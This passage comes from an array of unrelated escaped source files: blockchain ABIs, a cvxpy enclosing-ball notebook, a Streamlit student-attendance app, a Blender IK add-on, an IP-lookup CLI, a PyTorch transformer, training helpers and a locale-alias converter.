\"view\",\r\n        \"type\": \"function\"\r\n    }\r\n]\r\n\r\n# ABI untuk WINI (Wrapped INI)\r\nWINI_ABI = [\r\n    {\r\n        \"constant\": False,\r\n        \"inputs\": [],\r\n        \"name\": \"deposit\",\r\n        \"outputs\": [],\r\n        \"payable\": True,\r\n        \"stateMutability\": \"payable\",\r\n        \"type\": \"function\"\r\n    },\r\n    {\r\n        \"constant\": False,\r\n        \"inputs\": [{\"name\": \"wad\", \"type\": \"uint256\"}],\r\n        \"name\": \"withdraw\",\r\n        \"outputs\": [],\r\n        \"payable\": False,\r\n        \"stateMutability\": \"nonpayable\",\r\n        \"type\": \"function\"\r\n    }\r\n]\r\n\r\n# ABI untuk Create Token\r\nTOKEN_FACTORY_ABI = [\r\n    {\r\n        \"inputs\": [\r\n            {\"internalType\": \"string\", \"name\": \"name\", \"type\": \"string\"},\r\n            {\"internalType\": \"string\", \"name\": \"symbol\", \"type\": \"string\"},\r\n          ",
    "import marimo\n\n__generated_with = \"0.10.15\"\napp = marimo.App(width=\"medium\")\n\n\n@app.cell\ndef _(mo):\n    mo.md(\"\"\"# Problem\"\"\")\n    return\n\n\n@app.cell\ndef _(mo):\n    mo.md(\n        \"\"\"We compute the radius and center of the smallest enclosing ball for $N$ points in $d$ dimensions. We use a variety of tools and compare their performance.\"\"\"\n    )\n    return\n\n\n@app.cell\ndef _():\n    import marimo as mo\n\n    return (mo,)\n\n\n@app.cell\ndef _(mo):\n    mo.md(\"\"\"## Generate a cloud of points\"\"\")\n    return\n\n\n@app.cell\ndef _():\n    import plotly.graph_objects as go\n    import numpy as np\n\n    return go, np\n\n\n@app.cell\ndef _(np):\n    pos = np.random.randn(1000, 11)\n    return (pos,)\n\n\n@app.cell\ndef _(go, pos):\n    # Create the scatter plot\n    fig = go.Figure(\n        data=go.Scatter(\n            x=pos[:, 0], y=pos[:, 1], mode=\"markers\", marker=dict(symbol=\"x\", size=10)\n        )\n    )\n\n    # Update layout for equal aspect ratio and axis labels\n    fig.update_layout(\n        xaxis_title=\"x\",\n        yaxis_title=\"y\",\n        yaxis=dict(\n            scaleanchor=\"x\",\n            scaleratio=1,\n        ),\n    )\n\n    # Show the plot\n    fig.show()\n\n    # plot makes really only sense when using d=2\n    return (fig,)\n\n\n@app.cell\ndef _(mo):\n    mo.md(\"\"\"## Compute with cvxpy\"\"\")\n    return\n\n\n@app.cell\ndef _(np):\n    import cvxpy as cp\n\n    def min_circle_cvx(points, **kwargs):\n        # cvxpy variable for the radius\n        r = cp.Variable(1, name=\"Radius\")\n        # cvxpy variable for the midpoint\n        x = cp.Variable(points.shape[1], name=\"Midpoint\")\n\n        objective = cp.Minimize(r)\n        constraints = [\n            cp.SOC(\n                r * np.ones(points.shape[0]),\n                points - cp.outer(np.ones(points.shape[0]), x),\n                axis=1,\n            )\n        ]\n\n        problem = cp.Problem(objective=objective, constraints=constraints)\n        problem.solve(**kwargs)\n\n        return {\"Radius\": r.value, \"Midpoint\": x.value}\n\n    return cp, min_circle_cvx\n\n\n@app.cell\ndef _(min_circle_cvx, pos):\n    min_circle_cvx(points=pos, solver=\"CLARABEL\")\n    return\n\n\nif __name__ == \"__main__\":\n    app.run()\n",
    "import streamlit as st\n\nfrom src.pagerequests import *\nfrom src.attendance import *\nfrom src.cgpa import *\nfrom src.exams import *\n\ndef initializeSessionState():\n    if \"page\" not in st.session_state:\n        st.session_state.page = \"login_page\"\n\n    if \"rollno\" not in st.session_state:\n        st.session_state.rollno   = \"\"\n    \n    if \"password\" not in st.session_state:\n        st.session_state.password = \"\"\n\n    if \"slider\" not in st.session_state:\n        st.session_state.slider = 75\n\n    if \"attendance_result\" not in st.session_state:\n        st.session_state.attendance_table = \"\"\n\n    if \"attendance_session\" not in st.session_state:\n        st.session_state.attendance_session = \"\"\n\n    if \"attendance_data\" not in st.session_state:\n        st.session_state.attendance_data = \"\"\n\n    if \"courses_session\" not in st.session_state:\n        st.session_state.courses_session = \"\"\n\n\ndef displayLoginNote():\n    st.markdown(\n    \"\"\"\n        <div>\n            <link rel=\"stylesheet\" \n            href=\"https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@24,400,0,0&icon_names=encrypted\"/>\n            <p style = 'text-align:center;opacity:0.7;'>\n                    <span style='display:inline-block;margin:4px 0 0 0;'class=\"material-symbols-outlined\">encrypted</span>\n                    <span style='display:inline-block;margin:0px 0px 0px 0px;'>Your credentials and data are not stored!<span>\n            </p>\n        </div>\n    \"\"\",\n    unsafe_allow_html=True)\n    \n\ndef loginPage():\n    st.title(\"autoTracc\")\n    st.markdown(\"<p style = 'opacity:0.7'>Enter your studzone details</p>\", unsafe_allow_html=True)\n\n    #Use st.columns() to align the contents\n    white_space_left, login_form, white_space_right = st.columns([1,4,1]) #List represents ratio of column widths\n\n    #Use the middle column to center-justify our form\n    with login_form:\n\n        #Create a form\n        with st.form(key=\"login_form\"):\n\n            #Get user input\n            st.session_state.rollno   = st.text_input(\"RollNo:\")\n            st.session_state.password = st.text_input(\"Password:\" ,type=\"password\")\n\n            submit_button = st.form_submit_button()\n\n            #Following code is executed when button is clicked\n            if submit_button:\n\n                #Check if all details are entered\n                if not all( [st.session_state.rollno.strip(), st.session_state.password.strip()] ):\n                    st.warning(\"Please fill all the details!\")\n                \n                else:\n\n                    #Check if credentials are correct by requesting user data from studzone website\n                    attendance_home_page = getHomePageAttendance(st.session_state.rollno,st.session_state.password)\n\n                    #If credentials are correct we get the homepage\n                    if attendance_home_page:\n\n                        #Change session state and store the session\n                        st.session_state.page = \"dashboard\"\n                        st.session_state.attendance_session = attendance_home_page\n\n                        courses_home_page = getHomePageCGPA(st.session_state.rollno,st.session_state.password)\n                        st.session_state.courses_session = courses_home_page\n\n                        #Rerun the script with updated session state to go to the next page\n                        st.rerun()\n                    \n                    #If credentials incorrect then warn the user without leaving login page\n                    else:\n                        st.warning(\"Invalid Credentials! Try again!\")\n        #Display the disclaimer\n        displayLoginNote()\n\n        st.link_button(\"Demo\",\"https://youtu.be/aP-DL9kS5bk?si=P5ka4G6GpPHUALe_\")\n    \n\ndef dashBoardPage():\n    #Greet the user\n    user_name = getUsername(st.session_state.attendance_session)\n    st.title(f\"Welcome {user_name}!\")\n    st.divider()\n\n    #Separate attendance and CGPA details using tabs\n    attendance_tab, cgpa_tab, exams_tab = st.tabs([\"Attendance\",\"CGPA\",\"Exams\"])\n\n    #Compute the necessary details and store in session state\n    st.session_state.attendance_data = getStudentAttendance(st.session_state.attendance_session)\n    \n    #Get the date when attendance when recently updated\n    try:\n        updated_date = st.session_state.attendance_data[1][9]\n        attendance_available = True\n    except:\n        attendance_available = False\n\n    #Get the cgpa data and handle exceptions \n    try:\n        courses_data, completed_semester = getStudentCourses(st.session_state.courses_session)\n        cgpa_data = getCGPA(courses_data, completed_semester)\n        cgpa_available = True\n    except:\n        cgpa_available = False\n\n    schedule_data = getExamSchedule(st.session_state.attendance_session)\n\n    #Display attendance details\n    with attendance_tab:\n\n        if attendance_available:\n            #Create a slider\n            st.session_state.slider = st.slider(\n                label = \"Percentage you would l",
    "# This program is free software; you can redistribute it and/or modify\n# it under the terms of the GNU General Public License as published by\n# the Free Software Foundation; either version 3 of the License, or\n# (at your option) any later version.\n#\n# This program is distributed in the hope that it will be useful, but\n# WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTIBILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU\n# General Public License for more details.\n#\n# You should have received a copy of the GNU General Public License\n# along with this program. If not, see <http://www.gnu.org/licenses/>.\nimport bpy\nimport numpy as np\nimport sys\nimport subprocess\nfrom mathutils import Vector\nimport time\n\nbl_info = {\n    \"name\": \"RoboIK\",\n    \"author\": \"SFY\",\n    \"description\": \"\",\n    \"blender\": (2, 80, 0),\n    \"version\": (0, 0, 1),\n    \"location\": \"\",\n    \"warning\": \"\",\n    \"category\": \"Generic\",\n}\n# ----------------------------\u63d2\u4ef6\u914d\u7f6e\u9762\u677f-------------------------------\n\n\nclass RoboIKToolPrefs(bpy.types.AddonPreferences):\n\n    bl_idname = __name__\n\n    # \u5b9a\u4e49\u63d2\u4ef6\u53ef\u81ea\u5b9a\u4e49\u7684\u5c5e\u6027\n    is_install = False\n\n    try:\n        # import PIL\n        from ikpy.chain import Chain\n        from ikpy.link import OriginLink, URDFLink\n\n        is_install = True\n    #        print(\"is_install\")\n\n    except:\n        is_install = False\n\n    # \u7ed8\u5236\u63d2\u4ef6\u914d\u7f6eUI\u9762\u677f\n    def draw(self, context):\n        layout = self.layout\n\n        col = layout.column()\n        col.scale_y = 2\n        col.enabled = not self.is_install\n        col.label(text=\"\u60a8\u8fd8\u672a\u5b89\u88c5\u63d2\u4ef6\u4f9d\u8d56\uff1aIKPY\")\n        col.operator(InstallIKPYOperator.bl_idname, icon=\"IMPORT\")\n\n        col = layout.column()\n        col.scale_y = 2\n        col.enabled = self.is_install\n        col.label(text=\"\u4e0d\u518d\u4f7f\u7528\u5e76\u4e14\u8981\u5378\u8f7dIKPY \uff1f\")\n        col.operator(UnInstallIKPYOperator.bl_idname, icon=\"EXPORT\")\n\n\n# ----------------------------\u5b89\u88c5\u5de5\u5177-------------------------------\n\n\n# \u5b9a\u4e49\u5b89\u88c5 IKPY \u7684\u64cd\u4f5c\u7b26\u7c7b\nclass InstallIKPYOperator(bpy.types.Operator):\n    \"\"\"\n    \u64cd\u4f5c\u5458\u5728Blender\u7684Python\u73af\u5883\u4e2d\u5b89\u88c5IKPY\n    \"\"\"\n\n    bl_idname = \"addon.install_ikpy\"\n    bl_label = \"\u5b89\u88c5 IKPY\u5e93\uff08\u9700\u8981\u7f51\u7edc\uff09\"\n\n    def execute(self, context):\n        # \u83b7\u53d6Blender\u81ea\u5e26Python\u89e3\u91ca\u5668\u7684\u8def\u5f84\n        blender_python_path = sys.executable\n        try:\n            # \u6784\u5efa\u7528\u4e8e\u5b89\u88c5Pyaudio\u7684pip\u547d\u4ee4\n            install_command = [blender_python_path, \"-m\", \"pip\", \"install\", \"ikpy\"]\n            # \u6267\u884c\u547d\u4ee4\uff0c\u6355\u83b7\u8f93\u51fa\u548c\u9519\u8bef\u4fe1\u606f\n            process = subprocess.Popen(install_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n            stdout, stderr = process.communicate()\n            if process.returncode == 0:\n                self.report({\"INFO\"}, \"IKPY\u5b89\u88c5\u6210\u529f\uff01\")\n                RoboIKToolPrefs.is_install = True\n            else:\n                error_message = stderr.decode(\"utf-8\") if stderr else \"Unknown error\"\n                self.report({\"ERROR\"}, f\"\u7f3a\u5c11IKPY\u3002\u8bf7\u5728\u63d2\u4ef6\u9762\u677f\u4e0a\u5b89\u88c5 IKPY\u3002\")\n            return {\"FINISHED\"}\n        except Exception as e:\n            self.report({\"ERROR\"}, f\"\u5b89\u88c5\u8fc7\u7a0b\u4e2d\u51fa\u9519: {str(e)}\")\n            return {\"CANCELLED\"}\n\n\n# \u5b9a\u4e49\u5378\u8f7d IKPY \u7684\u64cd\u4f5c\u7b26\u7c7b\nclass UnInstallIKPYOperator(bpy.types.Operator):\n    \"\"\"\n    \u64cd\u4f5c\u5458\u4eceBlender\u7684Python\u73af\u5883\u4e2d\u5378\u8f7dIKPY\n    \"\"\"\n\n    bl_idname = \"addon.uninstall_ikpy\"\n    bl_label = \"\u5378\u8f7d IKPY\"\n\n    def execute(self, context):\n        try:\n            import ikpy\n\n        except:\n            self.report({\"ERROR\"}, f\"\u672a\u5b89\u88c5 IKPY\u3002\")\n            return {\"CANCELLED\"}\n        # \u83b7\u53d6Blender\u81ea\u5e26Python\u89e3\u91ca\u5668\u7684\u8def\u5f84\n        blender_python_path = sys.executable\n        try:\n            # \u6784\u5efa\u7528\u4e8e\u5378\u8f7dIKPY\u7684pip\u547d\u4ee4\n            uninstall_command = [blender_python_path, \"-m\", \"pip\", \"uninstall\", \"ikpy\", \"-y\"]\n            # \u6267\u884c\u547d\u4ee4\uff0c\u6355\u83b7\u8f93\u51fa\u548c\u9519\u8bef\u4fe1\u606f\n            process = subprocess.Popen(uninstall_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n            stdout, stderr = process.communicate()\n            if process.returncode == 0:\n                self.report({\"INFO\"}, \"IKPY \u5378\u8f7d\u6210\u529f\uff01\")\n                RoboIKToolPrefs.is_install = False\n            else:\n                error_message = stderr.decode(\"utf-8\") if stderr else \"Unknown error\"\n                self.report({\"ERROR\"}, f\"\u5378\u8f7d IKPY \u5931\u8d25\u3002\u9519\u8bef: {error_message}\")\n            return {\"FINISHED\"}\n        except Exception as e:\n            self.report({\"ERROR\"}, f\"\u5378\u8f7d\u8fc7\u7a0b\u4e2d\u51fa\u9519: {str(e)}\")\n\n            return {\"CANCELLED\"}\n\n\n# Define the operator class for the button\nclass TestOperator(bpy.types.Operator):\n    \"\"\"Roboik Operator\"\"\"\n\n    bl_idname = \"view3d.test_operator\"  # Unique identifier for buttons and menus\n    bl_label = \"test\"  # Display name in the interface\n\n    def execute(self, context):\n        # Your code here to perform the IK calculation with restrictions\n        chain_collection = context.scene.roboik_properties.chain_item_collection\n        collection_active_index = context.scene.roboik_properties.chain_item_collection_active_index\n        bone_collection_active_index = context.scene.roboik_properties.chain_bone_item_collection_active_index\n        val = chain_collection[collection_active_index].armature\n        print(val)\n        # self.report({\"INFO\"}, str(val))\n        return {\"FINISHED\"}\n",
    "import os\r\nimport time\r\nimport requests\r\nfrom concurrent.futures import ThreadPoolExecutor\r\nfrom colorama import init, Fore, Style\r\n\r\ninit(autoreset=True)\r\n\r\nSTART_COLOR = (144, 238, 144) \r\nEND_COLOR = (0, 100, 0)     \r\n\r\ndef clear_screen():\r\n    os.system('cls' if os.name == 'nt' else 'clear')\r\n\r\ndef rgb_to_ansi(r, g, b):\r\n    return f\"\\033[38;2;{r};{g};{b}m\"\r\n\r\ndef gradient_text(text, start_color, end_color):\r\n    start_r, start_g, start_b = start_color\r\n    end_r, end_g, end_b = end_color\r\n    length = len(text)\r\n\r\n    for i, char in enumerate(text):\r\n        ratio = i / max(1, length - 1)\r\n        r = int(start_r + (end_r - start_r) * ratio)\r\n        g = int(start_g + (end_g - start_g) * ratio)\r\n        b = int(start_b + (end_b - start_b) * ratio)\r\n        print(f\"{rgb_to_ansi(r, g, b)}{char}\", end=\"\")\r\n        time.sleep(0.01)\r\n    print(Style.RESET_ALL)\r\n\r\ndef input_gradient(prompt_text, start_color, end_color):\r\n    gradient_text(prompt_text, start_color, end_color)\r\n    return input(\"\")\r\n\r\ndef afficher_dessin():\r\n    ascii_art = \"\"\"\r\n\r\n                :::::::::: :::    :::  :::::::::\r\n                :+:        :+:    :+:  :+:    :+:\r\n                +:+         +:+  +:+   +:+    +:+\r\n                :#::+::#     +#++:+    +#++:++#+\r\n          +#+         +#+  +#+   +#+\r\n          #+#        #+#    #+#  #+#\r\n          ###        ###    ###  ###\r\n\r\n              | By FxP | GitHub : https://github.com/FxP-ro | Premium : https://fxp.mysellauth.com/ |\r\n       \r\n    \"\"\"\r\n    lines = ascii_art.splitlines()\r\n    max_length = max(len(line) for line in lines)\r\n    for line in lines:\r\n        print(' ' * ((max_length - len(line)) // 2), end='')\r\n        gradient_text(line, START_COLOR, END_COLOR)\r\n\r\ndef afficher_menu():\r\n    gradient_text(\"| Free Version |\", START_COLOR, END_COLOR)\r\n    gradient_text(\"[1] IP Lookup\", START_COLOR, END_COLOR)\r\n    gradient_text(\"[0] Leave\", START_COLOR, END_COLOR)\r\n\r\ndef ip_lookup(ip_address):\r\n    try:\r\n        response = requests.get(f\"https://ipinfo.io/{ip_address}/json\")\r\n        data = response.json()\r\n\r\n        gradient_text(f\"IP : {data.get('ip')}\\n\", START_COLOR, END_COLOR)\r\n        gradient_text(f\"City : {data.get('city')}\\n\", START_COLOR, END_COLOR)\r\n        gradient_text(f\"Region : {data.get('region')}\\n\", START_COLOR, END_COLOR)\r\n        gradient_text(f\"Country : {data.get('country')}\\n\", START_COLOR, END_COLOR)\r\n\r\n        location = data.get(\"loc\", \"0,0\")\r\n        gradient_text(f\"Contact details : {location}\\n\", START_COLOR, END_COLOR)\r\n\r\n\r\n\r\n    except Exception as e:\r\n        print(Fore.RED + f\"[!] Error : {e}\")\r\n\r\ndef main():\r\n    while True:\r\n        clear_screen()\r\n        afficher_dessin()\r\n        afficher_menu()\r\n    \r\n        choix = input_gradient(\"[/] Choose Option :\", START_COLOR, END_COLOR)\r\n        clear_screen()\r\n\r\n        if choix == '1':\r\n            # IP Lookup\r\n            ip_address = input_gradient(\"Enter IP : \", START_COLOR, END_COLOR)\r\n            clear_screen()\r\n            afficher_dessin()\r\n            ip_lookup(ip_address)\r\n        else:\r\n            print(Fore.RED + \"[!] Invalid Option\")\r\n\r\n        input_gradient(\"Press Enter to continue...\", START_COLOR, END_COLOR)\r\n\r\nif __name__ == \"__main__\":\r\n    main()\r\n",
    "import inspect\nimport math\nfrom dataclasses import dataclass\n\nimport torch\nimport torch.distributed as dist\nimport torch.nn as nn\nimport torch.nn.functional as F\n\ntorch.backends.cuda.matmul.allow_tf32 = True\ntorch.backends.cudnn.allow_tf32 = True\n\n\n@dataclass\nclass DDPDConfig:\n    model_type: str = \"ddpd\"\n    block_size: int = 1024  # 32x32 image tokens\n    vocab_size: int = int(2**16 + 1)\n    n_layer: int = 6\n    n_head: int = 4\n    n_embd: int = 512\n    qk_layernorm: bool = True\n    timesteps: int = 1000\n    max_t: float = 0.98\n    num_classes: int = 1000  # Number of ImageNet classes\n\n\nclass Rotary(nn.Module):\n    def __init__(self, dim, base=100, h=64, w=64, var_like_order=False):\n        super().__init__()\n        self.inv_freq = 1.0 / (base ** (torch.arange(0, dim, 2).float() / (dim)))\n        self.h = h\n        self.w = w\n\n        t_h = torch.arange(h).type_as(self.inv_freq)\n        t_w = torch.arange(w).type_as(self.inv_freq)\n        freqs_h = torch.outer(t_h, self.inv_freq).unsqueeze(1)\n        freqs_w = torch.outer(t_w, self.inv_freq).unsqueeze(0)\n        freqs_h = freqs_h.repeat(1, w, 1)\n        freqs_w = freqs_w.repeat(h, 1, 1)\n        freqs_hw = torch.cat([freqs_h, freqs_w], 2)\n\n        self.register_buffer(\"freqs_hw_cos\", freqs_hw.cos())\n        self.register_buffer(\"freqs_hw_sin\", freqs_hw.sin())\n        self.cache_cos = None\n        self.cache_sin = None\n\n    def forward(\n        self, x, height_width=None, extend_with_register_tokens=0, augment=False\n    ):\n        if self.cache_cos is not None and self.cache_sin is not None:\n            return self.cache_cos, self.cache_sin\n\n        if height_width is not None:\n            this_h, this_w = height_width\n        else:\n            this_hw = x.shape[1]\n            this_h, this_w = int(this_hw**0.5), int(this_hw**0.5)\n\n        if augment:\n            start_h = torch.randint(0, self.h - this_h + 1, (1,)).item()\n            start_w = torch.randint(0, self.w - this_w + 1, (1,)).item()\n        else:\n            start_h = 0\n            start_w = 0\n\n        cos = self.freqs_hw_cos[start_h : start_h + this_h, start_w : start_w + this_w]\n        sin = self.freqs_hw_sin[start_h : start_h + this_h, start_w : start_w + this_w]\n\n        cos = cos.clone().reshape(this_h * this_w, -1)\n        sin = sin.clone().reshape(this_h * this_w, -1)\n\n        if extend_with_register_tokens > 0:\n            cos = torch.cat(\n                [\n                    torch.ones(extend_with_register_tokens, cos.shape[1]).to(\n                        cos.device\n                    ),\n                    cos,\n                ],\n                0,\n            )\n            sin = torch.cat(\n                [\n                    torch.zeros(extend_with_register_tokens, sin.shape[1]).to(\n                        sin.device\n                    ),\n                    sin,\n                ],\n                0,\n            )\n\n        self.cache_cos = cos[None, :, None, :]\n        self.cache_sin = sin[None, :, None, :]\n\n        return self.cache_cos, self.cache_sin  # 1, T, 1, D\n\n\ndef apply_rotary_emb(x, cos, sin):\n    cos, sin = cos[:, : x.shape[1]], sin[:, : x.shape[1]]\n    assert x.ndim == 4\n    d = x.shape[3] // 2\n    x1 = x[..., :d]\n    x2 = x[..., d:]\n    y1 = x1 * cos + x2 * sin\n    y2 = x1 * (-sin) + x2 * cos\n    return torch.cat([y1, y2], 3).type_as(x)\n\n\nclass Block(nn.Module):\n    def __init__(self, config):\n        super().__init__()\n        # Combined projections for self-attention and MLP\n        self.chunked_fc = nn.Linear(config.n_embd, 8 * config.n_embd, bias=False)\n        self.attn_proj = nn.Linear(config.n_embd, config.n_embd, bias=False)\n\n        # Cross attention\n        self.cross_k = nn.Linear(config.n_embd, config.n_embd, bias=False)\n        self.cross_v = nn.Linear(config.n_embd, config.n_embd, bias=False)\n        self.cross_proj = nn.Linear(config.n_embd, config.n_embd, bias=False)\n\n        # MLP output projection\n        self.mlp_proj = nn.Linear(4 * config.n_embd, config.n_embd, bias=False)\n\n        self.n_head = config.n_head\n        self.head_dim = config.n_embd // config.n_head\n        self.n_embd = config.n_embd\n\n        # init proj to zeros\n        torch.nn.init.zeros_(self.attn_proj.weight)\n        torch.nn.init.zeros_(self.cross_proj.weight)\n        torch.nn.init.zeros_(self.mlp_proj.weight)\n\n        # make initialization bit smaller than typical\n        torch.nn.init.normal_(\n            self.chunked_fc.weight, mean=0.0, std=0.02 / math.sqrt(config.n_embd)\n        )\n\n    def forward(self, x, freq=None, context=None):\n        B, T, C = x.size()\n        H = self.n_head\n\n        # Combined self-attention + MLP input projection\n        qkv_mlp = F.rms_norm(x, (x.size(-1),))\n        chunks = self.chunked_fc(qkv_mlp).split([C, C, C, 4 * C, C], dim=-1)\n        q, k, v, mlp_intermediate, cross_q = chunks\n\n        # Self attention\n        q = q.view(B, T, H, self.head_dim)\n        k = k.view(B, T, H, self.head_dim)\n        v = v.view(B, T, H, self.head_dim)\n\n     ",
    "\"\"\"Some helper functions for PyTorch, including:\n    - get_mean_and_std: calculate the mean and std value of dataset.\n    - msr_init: net parameter initialization.\n    - progress_bar: progress bar mimic xlua.progress.\n\"\"\"\n\nimport errno\nimport os\nimport time\nimport pickle\n\nimport torch\nimport torch.nn as nn\nimport torch.nn.init as init\nimport numpy as np\nimport matplotlib.pyplot as plt\nfrom matplotlib.lines import Line2D\nimport argparse\n\n__all__ = [\n    \"get_mean_and_std\",\n    \"get_time\",\n    \"init_params\",\n    \"mkdir\",\n    \"save_object\",\n    \"load_object\",\n    \"AverageMeter\",\n    \"plot_grad_flow\",\n    \"load\",\n    \"str2bool\",\n    \"ParseDict\",\n]\n\n\ndef get_mean_and_std(dataset):\n    \"\"\"Compute the mean and std value of dataset.\"\"\"\n    dataloader = trainloader = torch.utils.data.DataLoader(\n        dataset, batch_size=1, shuffle=True, num_workers=2\n    )\n\n    mean = torch.zeros(3)\n    std = torch.zeros(3)\n    print(\"==> Computing mean and std..\")\n    for inputs, targets in dataloader:\n        for i in range(3):\n            mean[i] += inputs[:, i, :, :].mean()\n            std[i] += inputs[:, i, :, :].std()\n    mean.div_(len(dataset))\n    std.div_(len(dataset))\n    return mean, std\n\n\ndef get_time():\n    \"\"\"Get current time\"\"\"\n    return str(time.strftime(\"[%Y-%m-%d %H:%M:%S]\", time.localtime()))\n\n\ndef init_params(net):\n    \"\"\"Init layer parameters.\"\"\"\n    for m in net.modules():\n        if isinstance(m, nn.Conv2d):\n            init.kaiming_normal(m.weight, mode=\"fan_out\")\n            if m.bias:\n                init.constant(m.bias, 0)\n        elif isinstance(m, nn.BatchNorm2d):\n            init.constant(m.weight, 1)\n            init.constant(m.bias, 0)\n        elif isinstance(m, nn.Linear):\n            init.normal(m.weight, std=1e-3)\n            if m.bias:\n                init.constant(m.bias, 0)\n\n\ndef mkdir(path):\n    \"\"\"make dir if not exist\"\"\"\n    try:\n        os.makedirs(path)\n    except OSError as exc:  # Python >2.5\n        if exc.errno == errno.EEXIST and os.path.isdir(path):\n            pass\n        else:\n            raise\n\n\ndef save_object(obj, filename):\n    with open(filename, \"wb\") as output:\n        pickle.dump(obj, output, protocol=2)\n\n\ndef load_object(filename):\n    with open(filename, \"rb\") as input:\n        return pickle.load(input)\n\n\nclass AverageMeter(object):\n    \"\"\"Computes and stores the average and current value\n    Imported from https://github.com/pytorch/examples/blob/master/imagenet/main.py#L247-L262\n    \"\"\"\n\n    def __init__(self):\n        self.reset()\n\n    def reset(self):\n        self.val = 0\n        self.avg = 0\n        self.sum = 0\n        self.count = 0\n\n    def update(self, val, n=1):\n        self.val = val\n        self.sum += val * n\n        self.count += n\n        self.avg = self.sum / self.count\n\n\ndef plot_grad_flow(named_parameters):\n    \"\"\"Plots the gradients flowing through different layers in the net during training.\n    Can be used for checking for possible gradient vanishing / exploding problems.\n\n    Usage: Plug this function in Trainer class after loss.backwards() as\n    \"plot_grad_flow(self.model.named_parameters())\" to visualize the gradient flow\"\"\"\n    ave_grads = []\n    max_grads = []\n    layers = []\n    for n, p in named_parameters:\n        if (p.requires_grad) and (\"bias\" not in n):\n            layers.append(n)\n            ave_grads.append(p.grad.abs().mean())\n            max_grads.append(p.grad.abs().max())\n    plt.clf()\n    plt.bar(np.arange(len(max_grads)), max_grads, alpha=0.1, lw=1, color=\"c\")\n    plt.bar(np.arange(len(max_grads)), ave_grads, alpha=0.1, lw=1, color=\"b\")\n    plt.hlines(0, 0, len(ave_grads) + 1, lw=2, color=\"k\")\n    plt.xticks(range(0, len(ave_grads), 1), layers, rotation=\"vertical\")\n    plt.xlim(left=0, right=len(ave_grads))\n    # plt.ylim(bottom=-0.001, top=0.02)  # zoom in on the lower gradient regions\n    plt.xlabel(\"Layers\")\n    plt.ylabel(\"average gradient\")\n    plt.title(\"Gradient flow\")\n    plt.grid(True)\n    plt.legend(\n        [\n            Line2D([0], [0], color=\"c\", lw=4),\n            Line2D([0], [0], color=\"b\", lw=4),\n            Line2D([0], [0], color=\"k\", lw=4),\n        ],\n        [\"max-gradient\", \"mean-gradient\", \"zero-gradient\"],\n    )\n\n\ndef load(checkpoint_dir):\n    print(\" [*] Reading checkpoints...\", checkpoint_dir)\n\n    try:\n        checkpoint = torch.load(os.path.join(checkpoint_dir, \"checkpoint.pkl\"))\n        counter = int(checkpoint[\"steps\"])\n        print(\" [*] Success to read checkpoint, global step: {}\".format(counter))\n        return True, counter, checkpoint\n    except:\n        print(\" [*] Failed to find a checkpoint\")\n        return False, 0, None\n\n\ndef str2bool(v):\n    if isinstance(v, bool):\n        return v\n    if v.lower() in (\"yes\", \"true\", \"t\", \"y\", \"1\"):\n        return True\n    elif v.lower() in (\"no\", \"false\", \"f\", \"n\", \"0\"):\n        return False\n    else:\n        raise argparse.ArgumentTypeError(\"Boolean value expected.\")\n\n\nclass ParseDict(argparse.Action):\n    def __call__(self, parser, namespace, values,",
    "#!/usr/bin/env python3\n\"\"\"\n    Convert the X11 locale.alias file into a mapping dictionary suitable\n    for locale.py.\n\n    Written by Marc-Andre Lemburg <mal@genix.com>, 2004-12-10.\n\n\"\"\"\nimport locale\nimport sys\n_locale = locale\n\n# Location of the X11 alias file.\nLOCALE_ALIAS = '/usr/share/X11/locale/locale.alias'\n# Location of the glibc SUPPORTED locales file.\nSUPPORTED = '/usr/share/i18n/SUPPORTED'\n\ndef parse(filename):\n\n    with open(filename, encoding='latin1') as f:\n        lines = list(f)\n    # Remove mojibake in /usr/share/X11/locale/locale.alias.\n    # b'\\xef\\xbf\\xbd' == '\\ufffd'.encode('utf-8')\n    lines = [line for line in lines if '\\xef\\xbf\\xbd' not in line]\n    data = {}\n    for line in lines:\n        line = line.strip()\n        if not line:\n            continue\n        if line[:1] == '#':\n            continue\n        locale, alias = line.split()\n        # Fix non-standard locale names, e.g. ks_IN@devanagari.UTF-8\n        if '@' in alias:\n            alias_lang, _, alias_mod = alias.partition('@')\n            if '.' in alias_mod:\n                alias_mod, _, alias_enc = alias_mod.partition('.')\n                alias = alias_lang + '.' + alias_enc + '@' + alias_mod\n        # Strip ':'\n        if locale[-1] == ':':\n            locale = locale[:-1]\n        # Lower-case locale\n        locale = locale.lower()\n        # Ignore one letter locale mappings (except for 'c')\n        if len(locale) == 1 and locale != 'c':\n            continue\n        # Normalize encoding, if given\n        if '.' in locale:\n            lang, encoding = locale.split('.')[:2]\n            encoding = encoding.replace('-', '')\n            encoding = encoding.replace('_', '')\n            locale = lang + '.' + encoding\n        data[locale] = alias\n    return data\n\ndef parse_glibc_supported(filename):\n\n    with open(filename, encoding='latin1') as f:\n        lines = list(f)\n    data = {}\n    for line in lines:\n        line = line.strip()\n        if not line:\n            continue\n        if line[:1] == '#':\n            continue\n        line = line.replace('/', ' ').strip()\n        line = line.rstrip('\\\\').rstrip()\n        words = line.split()\n        if len(words) != 2:\n            continue\n        alias, alias_encoding = words\n        # Lower-case locale\n        locale = alias.lower()\n        # Normalize encoding, if given\n        if '.' in locale:\n            lang, encoding = locale.split('.')[:2]\n            encoding = encoding.replace('-', '')\n            encoding = encoding.replace('_', '')\n            locale = lang + '.' + encoding\n        # Add an encoding to alias\n        alias, _, modifier = alias.partition('@')\n        alias = _locale._replace_encoding(alias, alias_encoding)\n        if modifier and not (modifier == 'euro' and alias_encoding == 'ISO-8859-15'):\n            alias += '@' + modifier\n        data[locale] = alias\n    return data\n\ndef pprint(data):\n    items = sorted(data.items())\n    for k, v in items:\n        print('    %-40s%a,' % ('%a:' % k, v))\n\ndef print_differences(data, olddata):\n    items = sorted(olddata.items())\n    for k, v in items:\n        if k not in data:\n            print('#    removed %a' % k)\n        elif olddata[k] != data[k]:\n            print('#    updated %a -> %a to %a' % \\\n                  (k, olddata[k], data[k]))\n        # Additions are not mentioned\n\ndef optimize(data):\n    locale_alias = locale.locale_alias\n    locale.locale_alias = data.copy()\n    for k, v in data.items():\n        del locale.locale_alias[k]\n        if locale.normalize(k) != v:\n            locale.locale_alias[k] = v\n    newdata = locale.locale_alias\n    errors = check(data)\n    locale.locale_alias = locale_alias\n    if errors:\n        